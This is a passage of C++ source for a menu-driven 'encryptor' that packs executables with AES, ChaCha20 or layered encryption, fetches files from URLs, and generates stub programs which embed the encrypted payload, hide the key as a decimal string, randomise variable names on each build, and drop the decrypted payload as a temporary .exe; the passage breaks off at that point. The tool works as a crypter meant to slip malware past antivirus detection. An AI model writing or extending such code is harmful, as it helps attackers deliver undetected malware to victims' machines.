            while (carry > 0) {
                result.insert(result.begin(), carry % 10);
                carry /= 10;
            }
            
            carry = byte;
            for (int i = result.size() - 1; i >= 0 && carry > 0; i--) {
                int sum = result[i] + carry;
                result[i] = sum % 10;
                carry = sum / 10;
            }
            while (carry > 0) {
                result.insert(result.begin(), carry % 10);
                carry /= 10;
            }
        }
        
        std::string decimal;
        for (uint8_t digit : result) {
            decimal += ('0' + digit);
        }
        return decimal.empty() ? "0" : decimal;
    }

    std::string generateUniqueVarName() {
        const std::vector<std::string> prefixes = {"var", "data", "buf", "mem", "tmp", "obj", "ptr", "val", "cfg", "sys"};
        const std::vector<std::string> middles = {"Core", "Mgr", "Proc", "Ctrl", "Hdl", "Ref", "Ctx", "Buf", "Ops", "Util"};
        const std::vector<std::string> suffixes = {"Ex", "Ptr", "Obj", "Cfg", "Mgr", "Ctx", "Buf", "Ops", "Val", "Ref"};
        
        std::string name = prefixes[rng() % prefixes.size()];
        name += middles[rng() % middles.size()];
        name += suffixes[rng() % suffixes.size()];
        name += std::to_string(rng() % 10000);
        
        return name;
    }

public:
    VS2022MenuEncryptor() : rng(std::chrono::high_resolution_clock::now().time_since_epoch().count()) {}

    void showMenu() {
        std::cout << "\n=== Visual Studio 2022 Universal Encryptor ===" << std::endl;
        std::cout << "Advanced encryption tool with multiple algorithms and stealth features\n" << std::endl;
        
        std::cout << "Select an option:" << std::endl;
        std::cout << "  1. Pack File (AES Encryption) - Works like UPX" << std::endl;
        std::cout << "  2. Pack File (ChaCha20 Encryption) - Works like UPX" << std::endl;
        std::cout << "  3. Pack File (Triple Encryption) - Maximum Security" << std::endl;
        std::cout << "  4. Basic File Encryption (Save to disk)" << std::endl;
        std::cout << "  5. Advanced: Generate Custom MASM Stub" << std::endl;
        std::cout << "  6. URL Crypto Service (AES) - Download, Encrypt & Re-upload" << std::endl;
        std::cout << "  7. URL Crypto Service (Triple) - Download, Encrypt & Re-upload" << std::endl;
        std::cout << "  8. URL Crypto Service (ChaCha20) - Download, Encrypt & Re-upload" << std::endl;
        std::cout << "  9. URL Crypto Service (Basic) - Download, Encrypt & Save" << std::endl;
        std::cout << " 10. URL Pack File (AES) - Download & Pack from URL" << std::endl;
        std::cout << " 11. URL Pack File (ChaCha20) - Download & Pack from URL" << std::endl;
        std::cout << " 12. URL Pack File (Triple) - Download & Pack from URL" << std::endl;
        std::cout << " 13. Local Crypto Service (AES) - Pack Local File" << std::endl;
        std::cout << " 14. Local Crypto Service (ChaCha20) - Pack Local File" << std::endl;
        std::cout << " 15. Local Crypto Service (Triple) - Pack Local File" << std::endl;
        std::cout << "  0. Exit" << std::endl;
        std::cout << "\nEnter your choice: ";
    }
    void run() {
        int choice;
        std::cin >> choice;
        std::cin.ignore(); // Clear the newline character

        switch (choice) {
            case 1:
                generateAESPacker();
                break;
            case 2:
                generateChaCha20Packer();
                break;
            case 3:
                generateTriplePacker();
                break;
            case 4:
                basicFileEncryption();
                break;
            case 5:
                generateMASMStub();
                break;
            case 6:
                urlCryptoServiceAES();
                break;
            case 7:
                urlCryptoServiceTriple();
                break;
            case 8:
                urlCryptoServiceChaCha20();
                break;
            case 9:
                urlCryptoServiceBasic();
                break;
            case 10:
                urlPackFileAES();
                break;
            case 11:
                urlPackFileChaCha20();
                break;
            case 12:
                urlPackFileTriple();
                break;
            case 13:
                localCryptoServiceAES();
                break;
            case 14:
                localCryptoServiceChaCha20();
                break;
            case 15:
                localCryptoServiceTriple();
                break;
            case 0:
                std::cout << "Goodbye!" << std::endl;
                break;
            default:
                std::cout << "Invalid choice. Please try again." << std::endl;
        }
    }

    // Basic file encryption (option 4)
    void basicFileEncryption() {
        std::string inputFile;
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);

        std::ifstream file(inputFile, std::ios::binary);
        if (!file) {
            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
            return;
        }

        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        // Generate keys
        auto keys = generateKeys();
        
        // Apply triple encryption with randomized order
        std::vector<uint8_t> data = fileData;
        
        switch (keys.encryption_order) {
            case 0: // ChaCha20 -> AES -> XOR
                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(data, keys.aes_key);
                xorCrypt(data, keys.xor_key);
                break;
            case 1: // ChaCha20 -> XOR -> AES
                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(data, keys.xor_key);
                aesStreamCrypt(data, keys.aes_key);
                break;
            case 2: // AES -> ChaCha20 -> XOR
                aesStreamCrypt(data, keys.aes_key);
                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
                xorCrypt(data, keys.xor_key);
                break;
            case 3: // AES -> XOR -> ChaCha20
                aesStreamCrypt(data, keys.aes_key);
                xorCrypt(data, keys.xor_key);
                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
            case 4: // XOR -> ChaCha20 -> AES
                xorCrypt(data, keys.xor_key);
                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
                aesStreamCrypt(data, keys.aes_key);
                break;
            case 5: // XOR -> AES -> ChaCha20
                xorCrypt(data, keys.xor_key);
                aesStreamCrypt(data, keys.aes_key);
                chacha20Crypt(data, keys.chacha_key.data(), keys.chacha_nonce.data());
                break;
        }

        // Save encrypted file
        std::string outputFile = inputFile + ".encrypted";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (!outFile) {
            std::cout << "❌ Error: Cannot create output file " << outputFile << std::endl;
            return;
        }

        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outFile.close();

        std::cout << "✅ File encrypted successfully!" << std::endl;
        std::cout << "📁 Output: " << outputFile << std::endl;
        std::cout << "🔐 Encryption order: " << keys.encryption_order << std::endl;
        std::cout << "📏 Original size: " << fileData.size() << " bytes" << std::endl;
        std::cout << "📏 Encrypted size: " << data.size() << " bytes" << std::endl;
    }

    // AES Packer (option 1) - Works like UPX
    void generateAESPacker() {
        std::string inputFile;
        std::cout << "Enter input file path: ";
        std::getline(std::cin, inputFile);

        std::ifstream file(inputFile, std::ios::binary);
        if (!file) {
            std::cout << "❌ Error: Cannot open file " << inputFile << std::endl;
            return;
        }

        std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        // Generate AES key
        auto keys = generateKeys();
        std::vector<uint8_t> encryptedData = fileData;
        aesStreamCrypt(encryptedData, keys.aes_key);

        // Convert key to decimal for obfuscation
        std::string keyDecimal = bytesToBigDecimal(keys.aes_key);

        // Generate unique variable names
        std::string payloadVar = generateUniqueVarName();
        std::string keyVar = generateUniqueVarName();
        std::string sizeVar = generateUniqueVarName();
        std::string bufferVar = generateUniqueVarName();
        std::string funcName = generateUniqueVarName();

        // Create the packed executable source
        std::string sourceCode = R"(#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <cstdlib>
#endif

void )" + funcName + R"()(std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    static const unsigned char sbox[256] = {
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    };
    
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char keyByte = key[i % key.size()];
        unsigned char nonceByte = (i >> 8) ^ (i & 0xFF);
        unsigned char mixedKey = sbox[keyByte] ^ nonceByte;
        data[i] ^= mixedKey;
    }
}

std::vector<unsigned char> )" + keyVar + R"(FromDecimal(const std::string& decimal) {
    std::vector<unsigned char> result;
    std::vector<int> bigNum;
    
    for (char c : decimal) bigNum.push_back(c - '0');
    
    while (!bigNum.empty() && !(bigNum.size() == 1 && bigNum[0] == 0)) {
        int remainder = 0;
        for (size_t i = 0; i < bigNum.size(); i++) {
            int current = remainder * 10 + bigNum[i];
            bigNum[i] = current / 256;
            remainder = current % 256;
        }
        result.insert(result.begin(), remainder);
        while (!bigNum.empty() && bigNum[0] == 0) bigNum.erase(bigNum.begin());
    }
    
    return result;
}

int main() {
    const std::string )" + keyVar + R"( = ")" + keyDecimal + R"(";
    const unsigned int )" + sizeVar + R"( = )" + std::to_string(encryptedData.size()) + R"(;
    
    unsigned char )" + payloadVar + R"([)" + std::to_string(encryptedData.size()) + R"(] = {)";

        // Embed the encrypted payload
        for (size_t i = 0; i < encryptedData.size(); i++) {
            if (i % 16 == 0) sourceCode += "\n        ";
            sourceCode += "0x" + 
                std::string(1, "0123456789ABCDEF"[(encryptedData[i] >> 4) & 0xF]) + 
                std::string(1, "0123456789ABCDEF"[encryptedData[i] & 0xF]);
            if (i < encryptedData.size() - 1) sourceCode += ",";
        }

        sourceCode += R"(
    };
    
    std::vector<unsigned char> )" + bufferVar + R"(()" + payloadVar + R"(, )" + payloadVar + R"( + )" + sizeVar + R"();
    std::vector<unsigned char> keyBytes = )" + keyVar + R"(FromDecimal()" + keyVar + R"();
    
    )" + funcName + R"()()" + bufferVar + R"(, keyBytes);
    
#ifdef _WIN32
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string tempFile = std::string(tempPath) + "\\upx_temp_" + std::to_string(GetCurrentProcessId()) + ".exe";
#else
    std::string tempFile = "/tmp/upx_temp_" + std::to_string(getpid());
#endif
    
    std::ofstream outFile(tempFile, std::ios::binary);
    if (!outFile) return 1;
    
    outFile.write(reinterpret_cast<const char*>()" + bufferVar + R"(.data()), )" + bufferVar + R"(.size());
    outFile.close();
    
